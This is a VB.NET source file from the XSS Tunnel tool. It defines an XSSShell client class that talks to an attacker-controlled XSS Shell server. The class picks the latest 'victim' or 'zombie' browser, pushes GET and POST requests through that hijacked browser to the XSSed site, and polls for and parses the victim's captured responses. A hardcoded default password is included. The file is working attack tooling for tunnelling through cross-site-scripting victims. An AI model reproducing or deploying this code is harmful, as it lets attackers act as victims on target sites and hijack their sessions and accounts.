#Region "GPL License"

'This file is part of XSS Tunnel.
'
'XSS Tunnel, XSS Tunneling tool 
'Copyright (C) 2007 Ferruh Mavituna

'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.

'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'GNU General Public License for more details.

'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software
'Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
#End Region

Imports System.Net
Imports System.Threading
Imports System.Text

''' <summary>
''' XSS Shell Server
''' </summary>
''' <remarks></remarks>
Public Class XSSShell

#Region "Constants"

    ''' <summary>
    ''' Broadcast for all zombies)
    ''' </summary>
    ''' <remarks></remarks>
    Public Const BroadCastVictim As Integer = 336699

    ''' <summary>
    ''' Default page for getting data
    ''' </summary>
    ''' <remarks></remarks>
    Private Const DefaultDataPage As String = "showdata.asp"

    ''' <summary>
    ''' Default Push Command Page
    ''' </summary>
    ''' <remarks></remarks>
    Private Const DefaultCommandPage As String = "save.asp"


    ''' <summary>
    ''' Default XSS Shell Server Password
    ''' </summary>
    ''' <remarks></remarks>
    Private Const DefaultPassword As String = "w00t"


    ''' <summary>
    ''' Default Command Seperator (so dirty!)
    ''' </summary>
    ''' <remarks></remarks>
    Public Shared CommandSeperator As String = "|,|"

#End Region

#Region "Properties"


    Private _VictimId As Integer = -1
    ''' <summary>
    ''' Controlled Victim 
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property VictimId() As Integer
        Get
            UpdateVictim()
            Return _VictimId
        End Get
        Set(ByVal value As Integer)
            _VictimId = value
        End Set
    End Property

    ''' <summary>
    ''' Update Victim if required
    ''' </summary>
    ''' <remarks></remarks>
    Private Sub UpdateVictim()
        If _VictimId <= 10 Then _VictimId = GetLatestVictim()
    End Sub

    Private _IsVictimAlive As Boolean
    ''' <summary>
    ''' Is Victim Alive ?
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property IsVictimAlive() As Boolean
        Get
            UpdateVictim()
            Return _IsVictimAlive
        End Get
        Set(ByVal value As Boolean)
            _IsVictimAlive = value
        End Set
    End Property


    ''' <summary>
    ''' Get Latest Victim from Server
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetLatestVictim() As Integer
        Dim victimUri As New Uri(Me.Server, "?c=3&pass=" & Me.Password)
        Dim VictimId As Integer = ReadPageStatus(victimUri)

        Me.IsVictimAlive = (VictimId > 10)

        Return VictimId
    End Function

    ''' <summary>
    ''' Read page and return results as integer
    ''' </summary>
    ''' <param name="uri"></param>
    ''' <returns>-1 if not able to read page otherwise page response</returns>
    ''' <remarks></remarks>
    Private Function ReadPageStatus(ByVal uri As Uri) As Integer

        Dim RetStatus As Integer
        If Not Integer.TryParse(ReadPage(uri), RetStatus) Then
            RetStatus = -1
        End If

        Return RetStatus
    End Function


    Private _ServerData As Uri
    ''' <summary>
    ''' XSS Shell Server Data for Getting Results
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property ServerData() As Uri
        Get
            If _ServerData Is Nothing Then _ServerData = New Uri(Server, DefaultDataPage)
            Return _ServerData
        End Get
        Set(ByVal value As Uri)
            _ServerData = value
        End Set
    End Property


    Private _Server As Uri
    ''' <summary>
    ''' XSS Shell Server Uri
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property Server() As Uri
        Get
            If _Server Is Nothing Then Throw New ArgumentNullException("Server should supplied !")
            Return _Server
        End Get
        Set(ByVal value As Uri)
            _Server = value
        End Set
    End Property


    Private _ServerCommand As Uri
    ''' <summary>
    ''' Page to send commands
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property ServerCommand() As Uri
        Get
            If _ServerCommand Is Nothing Then _ServerCommand = New Uri(Server, DefaultCommandPage)
            Return _ServerCommand
        End Get
        Set(ByVal value As Uri)
            _ServerCommand = value
        End Set
    End Property


    Private _Password As String

    ''' <summary>
    ''' XSS Shell Server Password
    ''' </summary>
    ''' <value></value>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Property Password() As String
        Get
            Return _Password
        End Get
        Set(ByVal value As String)
            _Password = value
        End Set
    End Property

#End Region

#Region "Commands"

    ''' <summary>
    ''' Get Uri for GetURL Command with Post Data
    ''' </summary>
    ''' <param name="path">Relative or absolute path to target URL (should be same with XSSed host)</param>
    ''' <param name="postData">Post Data</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function NewGetUrlCommand(ByVal path As String, ByVal postData As String) As Uri

        'Add Post Request if exist
        If postData IsNot Nothing Then
            path &= CommandSeperator & postData
        End If

        Dim RetUri As Uri = New Uri(Server, Me.ServerCommand.AbsoluteUri & "?" & GetStandardParameters() & "&c=12&p=" & Web.HttpUtility.UrlEncode(path))

        Return RetUri
    End Function

    ''' <summary>
    ''' Get Uri for GetURL Command
    ''' </summary>
    ''' <param name="path">Relative or absolute path to target URL (should be same with XSSed host)</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function NewGetUrlCommand(ByVal path As String) As Uri
        Return NewGetUrlCommand(path, Nothing)
    End Function

#End Region

#Region "Helpers"


    ''' <summary>
    ''' Get standard parameters which will be added to all requests like Password and VictimId
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetStandardParameters() As String
        Return "pass=" & Me.Password & "&v=" & Me.VictimId.ToString
    End Function

    ''' <summary>
    ''' Read a Web Resource
    ''' </summary>
    ''' <param name="uri"></param>
    ''' <returns>Returns page source if successed else returns Nothing</returns>
    ''' <remarks></remarks>
    Private Shared Function ReadPage(ByVal uri As Uri) As String

        'Debug.WriteLine("Request : " & uri.AbsoluteUri)

        Dim HttpReader As New HttpReader(uri)
        Dim Ret As String = HttpReader.Request()

        Return Ret
    End Function

#End Region

#Region "Proxy Actions"

    ''' <summary>
    ''' Check XSS Shell server working and suitable for XSS Shell Proxy Connections
    ''' </summary>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Public Function CheckServer() As Boolean

        Dim Response As Integer = Me.VictimId
        If Integer.TryParse(ReadPage(New Uri(Server, "?XSSSHELLPROXY=1")), Response) Then
            Return (Response = 13)
        End If

        Return False
    End Function



    ''' <summary>
    ''' Send Request Command and get Response
    ''' </summary>
    ''' <param name="path">Relative or absolute path to target URL (should be same with XSSed host)</param>
    ''' <param name="postData">Post Data</param>
    ''' <returns>HTML Response from target. Nothing if it failed</returns>
    ''' <remarks></remarks>
    Public Function SendGetUriCommand(ByVal path As String, Optional ByVal postData As String = Nothing) As HttpResponse
        Dim SendUri As Uri = NewGetUrlCommand(path, postData)

        Dim XSSShellResponse As String = XSSShell.ReadPage(SendUri)
        Dim AttackId As Integer

        If Not Integer.TryParse(XSSShellResponse, AttackId) Then
            Return Nothing
        End If

        'If it's lower than 10 error
        If AttackId < 10 Then
            Return Nothing
        End If

        'Wait for response
        Return GetResponse(AttackId)
    End Function

    ''' <summary>
    ''' Get Response from XSS Shell Server
    ''' </summary>
    ''' <param name="AttackId">Associated AttackId</param>
    ''' <returns></returns>
    ''' <remarks></remarks>
    Private Function GetResponse(ByVal AttackId As Integer) As HttpResponse

        Dim MaxRetry As Integer = 30
        Dim DataUri As Uri = New Uri(Server, Me.ServerData.AbsoluteUri & "?" & GetStandardParameters() & "&m=2&i=" & AttackId.ToString)

        Dim Response As String
        Do
            Thread.Sleep(1000)
            Response = ReadPage(DataUri)
            MaxRetry -= 1
        Loop While Response = "NO_RECORD" AndAlso MaxRetry > 0

        If MaxRetry = 0 Then
            Debug.WriteLine("ERR: Retry timeout!")
            Return Nothing
        End If

        If Not Response Is Nothing Then

            Response = Web.HttpUtility.UrlDecode(Response)

            'Fix Js Newlines
            Response = Response.Replace(Chr(10), vbNewLine)

            'Content Start Position
            Dim BodyPos As Integer = Response.IndexOf(vbNewLine & vbNewLine)

            'Wrong Response (no content)
            If BodyPos = -1 Then
                Debug.WriteLine("ERR: There is no double newline for content start")
                Return Nothing
            End If

            'Generate Http Response
            Dim RawHeaders As String = Response.Substring(0, BodyPos)
            Dim BodyBinary As String = Response.Substring(BodyPos + 6, Response.Length - (BodyPos + 6))
            Dim HttpParser As New HttpParser(RawHeaders, XSSTunnelLib.HttpParser.DecodeBinary(BodyBinary))

            Return HttpParser.HttpResponse
        End If

        Debug.WriteLine("ERR: Response is Nothing")
        Return Nothing
    End Function

#End Region

#Region "Constructors"

    Public Sub New(ByVal server As String, ByVal password As String)
        Me.Server = New Uri(server)
        Me.Password = password
    End Sub

#End Region

End Class
